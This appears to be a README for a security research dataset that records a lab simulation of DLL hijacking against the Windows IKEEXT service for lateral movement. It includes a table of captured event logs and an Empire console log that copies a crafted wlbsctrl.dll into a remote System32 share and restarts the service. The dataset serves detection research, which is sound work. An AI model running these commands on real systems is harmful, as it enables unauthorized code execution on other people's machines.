# SCM and Dll Hijacking IKEEXT

Instead of creating new services, attackers can move laterally using the SCM by copying specifically crafted Dynamic Link Library (DLL) files to trusted directories and restarting services remotely. This is made possible due to the fact that these services call LoadLibrary on libraries not present in the specified path.

IKEEXT hosts the Internet Key Exchange (IKE) and Authenticated Internet Protocol (AuthIP) keying modules. When the service is started, it searches for the file wlbsctrl.dll. This is the first indicator that the service is potentially vulnerable to DLL hijacking. [Reference](https://medium.com/@djhohnstein)

## Technique(s) ID

T1105

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_scm_dll_hijack_ikeext.tar.gz](./empire_scm_dll_hijack_ikeext.tar.gz)

## Network Environment

Shire

## Time Taken

2019-04-03133337

## About this file

| log_name                                   | source_name                         | task                                                   |   record_number |
|--------------------------------------------|-------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                         | PowerShell                          | Pipeline Execution Details                             |            1000 |
| System                                     | Service Control Manager             | na                                                     |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Filtering Platform Connection                          |             487 |
| Security                                   | Microsoft-Windows-Security-Auditing | Removable Storage                                      |             194 |
| Security                                   | Microsoft-Windows-Security-Auditing | Token Right Adjusted Events                            |             193 |
| Security                                   | Microsoft-Windows-Security-Auditing | Handle Manipulation                                    |              60 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Termination                                    |              46 |
| Security                                   | Microsoft-Windows-Security-Auditing | Process Creation                                       |              32 |
| Security                                   | Microsoft-Windows-Security-Auditing | User Account Management                                |              32 |
| Security                                   | Microsoft-Windows-Security-Auditing | Group Membership                                       |              26 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logon                                                  |              26 |
| Security                                   | Microsoft-Windows-Security-Auditing | Special Logon                                          |              24 |
| Security                                   | Microsoft-Windows-Security-Auditing | Sensitive Privilege Use                                |              22 |
| Security                                   | Microsoft-Windows-Security-Auditing | Logoff                                                 |              17 |
| Security                                   | Microsoft-Windows-Security-Auditing | Authorization Policy Change                            |              16 |
| Security                                   | Microsoft-Windows-Security-Auditing | Detailed File Share                                    |              14 |
| Security                                   | Microsoft-Windows-Security-Auditing | Other Object Access Events                             |               7 |
| Security                                   | Microsoft-Windows-Security-Auditing | File Share                                             |               6 |
| Security                                   | Microsoft-Windows-Security-Auditing | File System                                            |               4 |
| Security                                   | Microsoft-Windows-Security-Auditing | SAM                                                    |               3 |
| Security                                   | Microsoft-Windows-Security-Auditing | Security Group Management                              |               2 |
| Security                                   | Microsoft-Windows-Security-Auditing | Security System Extension                              |               1 |
| Microsoft-Windows-WMI-Activity/Operational | Microsoft-Windows-WMI-Activity      | na                                                     |               4 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process accessed (rule: ProcessAccess)                 |            4048 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry object added or deleted (rule: RegistryEvent) |            3984 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Image loaded (rule: ImageLoad)                         |            1650 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Registry value set (rule: RegistryEvent)               |            1056 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Network connection detected (rule: NetworkConnect)     |             275 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | File created (rule: FileCreate)                        |             106 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Connected (rule: PipeEvent)                       |              52 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | RawAccessRead detected (rule: RawAccessRead)           |              39 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Process Create (rule: ProcessCreate)                   |              32 |
| Microsoft-Windows-Sysmon/Operational       | Microsoft-Windows-Sysmon            | Pipe Created (rule: PipeEvent)                         |               5 |
| Microsoft-Windows-PowerShell/Operational   | Microsoft-Windows-PowerShell        | Executing Pipeline                                     |             835 |
| Microsoft-Windows-DNS-Client/Operational   | Microsoft-Windows-DNS-Client        | na                                                     |             421 |

## Attacker Activity

```
(Empire: NZB6SE34) > upload /tmp/wlbsctrl.dll
[*] Tasked agent to upload wlbsctrl.dll, 124 KB
[*] Tasked NZB6SE34 to run TASK_UPLOAD
[*] Agent NZB6SE34 tasked with task ID 46
(Empire: NZB6SE34) > shell COPY .\wlbsctrl.dll \\HR001\C$\Windows\System32\wlbsctrl.dll
[*] Tasked NZB6SE34 to run TASK_SHELL
[*] Agent NZB6SE34 tasked with task ID 47
(Empire: NZB6SE34) > ..Command execution completed.

(Empire: NZB6SE34) > shell sc.exe `\`\HR001 stop IKEEXT
[*] Tasked NZB6SE34 to run TASK_SHELL
[*] Agent NZB6SE34 tasked with task ID 48
(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT 
        TYPE               : 30  WIN32  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x1388

..Command execution completed.

(Empire: NZB6SE34) > shell sc.exe `\`\HR001 query IKEEXT
[*] Tasked NZB6SE34 to run TASK_SHELL
[*] Agent NZB6SE34 tasked with task ID 49
(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

..Command execution completed.

(Empire: NZB6SE34) > shell sc.exe `\`\HR001 start IKEEXT
[*] Tasked NZB6SE34 to run TASK_SHELL
[*] Agent NZB6SE34 tasked with task ID 50
(Empire: NZB6SE34) > SERVICE_NAME: IKEEXT 
        TYPE               : 30  WIN32  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4500
        FLAGS              : 

..Command execution completed.

(Empire: NZB6SE34) > 
```
